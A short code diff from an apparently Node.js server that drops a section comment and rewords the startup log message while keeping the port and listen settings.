-// ==================== SERVER START ====================
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log("🚀 Advanced OS Server Running on Port " + PORT);
+    console.log("🚀 Advanced OS Server Live on Port " + PORT);
 });
